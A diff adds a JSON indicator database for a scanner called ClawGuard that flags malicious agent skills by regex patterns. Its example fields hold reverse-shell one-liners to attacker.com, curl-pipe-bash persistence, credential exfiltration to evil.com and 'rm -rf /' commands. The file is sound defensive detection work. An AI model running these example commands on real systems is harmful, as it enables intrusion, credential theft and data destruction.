@@ -1,0 +1,507 @@
+{
+  "version": "1.0.0",
+  "source": "ClawGuard Initial Database (based on BUILD_SPEC patterns)",
+  "last_updated": "2026-02-18",
+  "indicators": [
+    {
+      "id": "CH-001",
+      "category": "remote_access",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "socket\\.connect\\s*\\(",
+      "description": "Socket connection - potential reverse shell or C2 communication",
+      "example": "s.connect(('attacker.com', 4444))",
+      "false_positive_notes": "Legitimate network clients may use this. Check destination."
+    },
+    {
+      "id": "CH-002",
+      "category": "remote_access",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "subprocess\\.(call|run|Popen).*(/bin/(ba)?sh|cmd\\.exe)",
+      "description": "Subprocess spawning a shell - high likelihood of reverse shell",
+      "example": "subprocess.Popen(['/bin/bash', '-i'])",
+      "false_positive_notes": "Very rare legitimate use. Almost always malicious."
+    },
+    {
+      "id": "CH-003",
+      "category": "remote_access",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "os\\.system\\s*\\(.*\\b(nc|ncat|netcat|bash\\s+-i)\\b",
+      "description": "System call with netcat or interactive bash",
+      "example": "os.system('nc -e /bin/bash attacker.com 4444')",
+      "false_positive_notes": "No legitimate use case. Always malicious."
+    },
+    {
+      "id": "CH-004",
+      "category": "remote_access",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "pty\\.spawn",
+      "description": "PTY spawn - creates pseudo-terminal, often used in reverse shells",
+      "example": "pty.spawn('/bin/bash')",
+      "false_positive_notes": "Rare legitimate use in terminal emulation. Flag for review."
+    },
+    {
+      "id": "CH-005",
+      "category": "data_exfiltration",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "requests\\.(get|post|put)\\s*\\(.*({os\\.environ|\\.ssh|\\.aws|\\.config})",
+      "description": "HTTP request containing sensitive data (env vars, SSH keys, AWS creds)",
+      "example": "requests.post(url, data={'key': os.environ['AWS_SECRET']})",
+      "false_positive_notes": "Check if destination is expected API endpoint."
+    },
+    {
+      "id": "CH-006",
+      "category": "data_exfiltration",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "urllib\\.request\\.urlopen.*({os\\.environ|\\.ssh|\\.aws})",
+      "description": "URL request with sensitive data exfiltration",
+      "example": "urllib.request.urlopen(url + os.environ['API_KEY'])",
+      "false_positive_notes": "Verify the URL destination is legitimate."
+    },
+    {
+      "id": "CH-007",
+      "category": "credential_harvest",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "open\\s*\\(.*(etc/passwd|/etc/shadow|\\.ssh/|\\.aws/credentials|\\.env)",
+      "description": "Reading sensitive system files (passwords, SSH keys, AWS credentials)",
+      "example": "open('/home/user/.ssh/id_rsa').read()",
+      "false_positive_notes": "No legitimate skill should access these files."
+    },
+    {
+      "id": "CH-008",
+      "category": "code_execution",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "exec\\s*\\(\\s*base64\\.b64decode",
+      "description": "Executing base64-decoded content - classic obfuscation technique",
+      "example": "exec(base64.b64decode('aW1wb3J0IG9z...'))",
+      "false_positive_notes": "Almost always malicious. No legitimate use."
+    },
+    {
+      "id": "CH-009",
+      "category": "code_execution",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "eval\\s*\\(\\s*base64\\.b64decode",
+      "description": "Evaluating base64-decoded content - obfuscated code execution",
+      "example": "eval(base64.b64decode(payload))",
+      "false_positive_notes": "No legitimate use. Always malicious."
+    },
+    {
+      "id": "CH-010",
+      "category": "persistence",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "crontab",
+      "description": "Crontab manipulation - may establish persistence",
+      "example": "os.system('crontab -l | echo \"* * * * * /tmp/evil.sh\" | crontab -')",
+      "false_positive_notes": "Check if skill legitimately needs scheduling."
+    },
+    {
+      "id": "CH-011",
+      "category": "persistence",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "systemctl\\s+(enable|start)",
+      "description": "Systemd service manipulation - may establish persistence",
+      "example": "os.system('systemctl enable malicious.service')",
+      "false_positive_notes": "Skills should not manage system services."
+    },
+    {
+      "id": "CH-012",
+      "category": "persistence",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "/etc/init\\.d/",
+      "description": "Init.d script manipulation - legacy persistence mechanism",
+      "example": "shutil.copy('evil.sh', '/etc/init.d/backdoor')",
+      "false_positive_notes": "No legitimate skill use case."
+    },
+    {
+      "id": "CH-013",
+      "category": "persistence",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "\\.bashrc|\\.bash_profile|\\.profile",
+      "description": "Shell profile modification - persistence through login shells",
+      "example": "open('~/.bashrc', 'a').write('curl evil.com/shell | bash')",
+      "false_positive_notes": "Check if modification is legitimate (e.g., PATH updates)."
+    },
+    {
+      "id": "CH-014",
+      "category": "crypto_mining",
+      "severity": "critical",
+      "pattern_type": "regex",
+      "pattern": "(stratum|xmrig|minerd|cpuminer)",
+      "description": "Cryptocurrency mining software references",
+      "example": "subprocess.run(['xmrig', '-o', 'pool.mining.com'])",
+      "false_positive_notes": "No legitimate skill use case."
+    },
+    {
+      "id": "CH-015",
+      "category": "crypto_mining",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "hashrate|nonce.*block",
+      "description": "Mining-related terminology in code",
+      "example": "print(f'Hashrate: {hashrate}')",
+      "false_positive_notes": "May appear in blockchain-related legitimate skills."
+    },
+    {
+      "id": "CH-016",
+      "category": "credential_harvest",
+      "severity": "critical",
+      "pattern_type": "string_match",
+      "pattern": "BEGIN RSA PRIVATE KEY",
+      "description": "RSA private key marker - credential exfiltration",
+      "example": "if 'BEGIN RSA PRIVATE KEY' in content: send(content)",
+      "false_positive_notes": "Skills should never handle private keys."
+    },
+    {
+      "id": "CH-017",
+      "category": "credential_harvest",
+      "severity": "critical",
+      "pattern_type": "string_match",
+      "pattern": "BEGIN OPENSSH PRIVATE KEY",
+      "description": "OpenSSH private key marker - credential exfiltration",
+      "example": "key = open('~/.ssh/id_ed25519').read()",
+      "false_positive_notes": "Skills should never handle SSH keys."
+    },
+    {
+      "id": "CH-018",
+      "category": "credential_harvest",
+      "severity": "high",
+      "pattern_type": "string_match",
+      "pattern": "AKIA",
+      "description": "AWS Access Key ID prefix - potential credential handling",
+      "example": "aws_key = 'AKIAIOSFODNN7EXAMPLE'",
+      "false_positive_notes": "May be legitimate if skill is AWS-related. Verify usage."
+    },
+    {
+      "id": "CH-019",
+      "category": "credential_harvest",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "sk-[a-zA-Z0-9]{20,}",
+      "description": "OpenAI API key pattern - potential credential exposure",
+      "example": "openai_key = 'sk-...'",
+      "false_positive_notes": "May be legitimate in AI skills. Check if key is hardcoded."
+    },
+    {
+      "id": "CH-020",
+      "category": "credential_harvest",
+      "severity": "high",
+      "pattern_type": "string_match",
+      "pattern": "ghp_",
+      "description": "GitHub Personal Access Token prefix",
+      "example": "github_token = 'ghp_xxxx'",
+      "false_positive_notes": "May be legitimate in GitHub skills. Check if hardcoded."
+    },
+    {
+      "id": "CH-021",
+      "category": "remote_access",
+      "severity": "critical",
+      "pattern_type": "string_match",
+      "pattern": "/dev/tcp/",
+      "description": "Bash /dev/tcp reverse shell technique",
+      "example": "bash -i >& /dev/tcp/attacker/4444 0>&1",
+      "false_positive_notes": "No legitimate use. Always malicious."
+    },
+    {
+      "id": "CH-022",
+      "category": "network",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "socket\\.socket\\s*\\(",
+      "description": "Raw socket creation - may be used for network attacks",
+      "example": "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
+      "false_positive_notes": "Legitimate in networking skills. Review context."
+    },
+    {
+      "id": "CH-023",
+      "category": "network",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "requests\\.(get|post|put|delete|patch)\\s*\\(",
+      "description": "HTTP request - check for data exfiltration",
+      "example": "requests.post('http://evil.com', data=secrets)",
+      "false_positive_notes": "Very common in legitimate skills. Check destination URL."
+    },
+    {
+      "id": "CH-024",
+      "category": "network",
+      "severity": "medium",
+      "pattern_type": "regex",
+      "pattern": "http\\.server",
+      "description": "HTTP server creation - may expose local services",
+      "example": "python -m http.server 8000",
+      "false_positive_notes": "May be legitimate for local development skills."
+    },
+    {
+      "id": "CH-025",
+      "category": "file_access",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "open\\s*\\(\\s*['\"]/(etc|root|home|tmp|var)",
+      "description": "Opening files outside skill directory",
+      "example": "open('/etc/passwd').read()",
+      "false_positive_notes": "Check if access is to expected system files."
+    },
+    {
+      "id": "CH-026",
+      "category": "file_access",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "os\\.(walk|listdir|scandir)\\s*\\(\\s*['\"]/(etc|root|home)",
+      "description": "Directory traversal outside skill directory",
+      "example": "for root, dirs, files in os.walk('/home'):",
+      "false_positive_notes": "Skills should not scan system directories."
+    },
+    {
+      "id": "CH-027",
+      "category": "file_access",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "shutil\\.(copy|move|rmtree)\\s*\\(",
+      "description": "File manipulation - may delete or move critical files",
+      "example": "shutil.rmtree('/home/user/.ssh')",
+      "false_positive_notes": "Check source and destination paths carefully."
+    },
+    {
+      "id": "CH-028",
+      "category": "code_execution",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "exec\\s*\\(",
+      "description": "Dynamic code execution - may execute malicious code",
+      "example": "exec(user_input)",
+      "false_positive_notes": "Check what is being executed. Avoid user input."
+    },
+    {
+      "id": "CH-029",
+      "category": "code_execution",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "eval\\s*\\(",
+      "description": "Dynamic evaluation - may execute malicious expressions",
+      "example": "eval(user_input)",
+      "false_positive_notes": "Extremely dangerous with user input. Review carefully."
+    },
+    {
+      "id": "CH-030",
+      "category": "code_execution",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "__import__\\s*\\(",
+      "description": "Dynamic import - may load malicious modules",
+      "example": "__import__('os').system('rm -rf /')",
+      "false_positive_notes": "May be legitimate for plugin systems. Review context."
+    },
+    {
+      "id": "CH-031",
+      "category": "code_execution",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "subprocess\\.(call|run|Popen|check_output)\\s*\\(",
+      "description": "Subprocess execution - may run malicious commands",
+      "example": "subprocess.run(['rm', '-rf', '/'])",
+      "false_positive_notes": "Common in skills. Verify commands are safe."
+    },
+    {
+      "id": "CH-032",
+      "category": "code_execution",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "os\\.system\\s*\\(",
+      "description": "System command execution",
+      "example": "os.system('curl evil.com/shell | bash')",
+      "false_positive_notes": "subprocess is preferred. Check command carefully."
+    },
+    {
+      "id": "CH-033",
+      "category": "obfuscation",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "base64\\.(b64decode|decodebytes)",
+      "description": "Base64 decoding - may hide malicious payload",
+      "example": "payload = base64.b64decode(encoded_evil)",
+      "false_positive_notes": "Common for data handling. Check what is decoded."
+    },
+    {
+      "id": "CH-034",
+      "category": "obfuscation",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "codecs\\.decode.*rot_13",
+      "description": "ROT13 decoding - simple obfuscation technique",
+      "example": "codecs.decode('vzcbeg bf', 'rot_13')",
+      "false_positive_notes": "Often used to hide malicious imports."
+    },
+    {
+      "id": "CH-035",
+      "category": "obfuscation",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "marshal\\.loads",
+      "description": "Marshal deserialization - can execute arbitrary code",
+      "example": "exec(marshal.loads(code_object))",
+      "false_positive_notes": "Very rare legitimate use. Usually malicious."
+    },
+    {
+      "id": "CH-036",
+      "category": "obfuscation",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "pickle\\.loads",
+      "description": "Pickle deserialization - arbitrary code execution vulnerability",
+      "example": "pickle.loads(untrusted_data)",
+      "false_positive_notes": "Never use with untrusted data. Review carefully."
+    },
+    {
+      "id": "CH-037",
+      "category": "environment",
+      "severity": "medium",
+      "pattern_type": "regex",
+      "pattern": "os\\.environ\\s*\\[",
+      "description": "Direct environment variable access",
+      "example": "api_key = os.environ['SECRET_KEY']",
+      "false_positive_notes": "Common and often legitimate. Check what is accessed."
+    },
+    {
+      "id": "CH-038",
+      "category": "environment",
+      "severity": "medium",
+      "pattern_type": "regex",
+      "pattern": "os\\.getenv",
+      "description": "Environment variable retrieval",
+      "example": "os.getenv('AWS_SECRET_ACCESS_KEY')",
+      "false_positive_notes": "Common in skills. Verify necessity."
+    },
+    {
+      "id": "CH-039",
+      "category": "input_capture",
+      "severity": "medium",
+      "pattern_type": "regex",
+      "pattern": "pyperclip",
+      "description": "Clipboard access - may steal clipboard content",
+      "example": "import pyperclip; data = pyperclip.paste()",
+      "false_positive_notes": "May be legitimate for clipboard utilities."
+    },
+    {
+      "id": "CH-040",
+      "category": "input_capture",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "pynput",
+      "description": "Input monitoring library - potential keylogger",
+      "example": "from pynput.keyboard import Listener",
+      "false_positive_notes": "Rare legitimate use. Usually malicious."
+    },
+    {
+      "id": "CH-041",
+      "category": "input_capture",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "keyboard\\.(read_key|on_press|record)",
+      "description": "Keyboard capture - potential keylogger",
+      "example": "keyboard.on_press(log_key)",
+      "false_positive_notes": "May be legitimate for hotkey skills. Review carefully."
+    },
+    {
+      "id": "CH-042",
+      "category": "screen_capture",
+      "severity": "medium",
+      "pattern_type": "regex",
+      "pattern": "pyautogui\\.screenshot",
+      "description": "Screenshot capture - may capture sensitive information",
+      "example": "pyautogui.screenshot('/tmp/screen.png')",
+      "false_positive_notes": "May be legitimate for automation skills."
+    },
+    {
+      "id": "CH-043",
+      "category": "dependency",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "pip\\s+install",
+      "description": "Runtime package installation - may install malicious packages",
+      "example": "os.system('pip install evil-package')",
+      "false_positive_notes": "Skills should declare dependencies, not install at runtime."
+    },
+    {
+      "id": "CH-044",
+      "category": "file_access",
+      "severity": "warning",
+      "pattern_type": "regex",
+      "pattern": "os\\.chmod",
+      "description": "File permission modification",
+      "example": "os.chmod('/tmp/script.sh', 0o755)",
+      "false_positive_notes": "May be legitimate. Check what permissions are set."
+    },
+    {
+      "id": "CH-045",
+      "category": "file_access",
+      "severity": "warning",
+      "pattern_type": "regex",
+      "pattern": "os\\.remove|os\\.unlink",
+      "description": "File deletion",
+      "example": "os.remove('/important/file')",
+      "false_positive_notes": "Check what files are being deleted."
+    },
+    {
+      "id": "CH-046",
+      "category": "concurrency",
+      "severity": "warning",
+      "pattern_type": "regex",
+      "pattern": "daemon\\s*=\\s*True",
+      "description": "Daemon thread - may run in background persistently",
+      "example": "t = threading.Thread(target=evil, daemon=True)",
+      "false_positive_notes": "Check if background processing is legitimate."
+    },
+    {
+      "id": "CH-047",
+      "category": "native_code",
+      "severity": "warning",
+      "pattern_type": "regex",
+      "pattern": "import\\s+ctypes",
+      "description": "ctypes import - allows calling C functions directly",
+      "example": "import ctypes; ctypes.CDLL('libc.so.6')",
+      "false_positive_notes": "May be legitimate for system integration."
+    },
+    {
+      "id": "CH-048",
+      "category": "network",
+      "severity": "medium",
+      "pattern_type": "regex",
+      "pattern": "socket\\.gethostbyname",
+      "description": "DNS lookup - may be reconnaissance",
+      "example": "socket.gethostbyname('internal.company.com')",
+      "false_positive_notes": "May be legitimate networking. Check purpose."
+    },
+    {
+      "id": "CH-049",
+      "category": "network",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "(bit\\.ly|tinyurl\\.com|t\\.co|goo\\.gl|is\\.gd)",
+      "description": "URL shortener - may hide malicious destination",
+      "example": "requests.get('https://bit.ly/xyz')",
+      "false_positive_notes": "Skills should use full URLs. Flag for review."
+    },
+    {
+      "id": "CH-050",
+      "category": "network",
+      "severity": "high",
+      "pattern_type": "regex",
+      "pattern": "\\.(tk|ml|ga|cf|gq|xyz|top|work|click)(['\"/]|$)",
+      "description": "Suspicious TLD - commonly used for malicious domains",
+      "example": "requests.get('http://evil-server.tk/payload')",
+      "false_positive_notes": "Some legitimate sites use these TLDs. Verify domain."
+    }
+  ]
+}
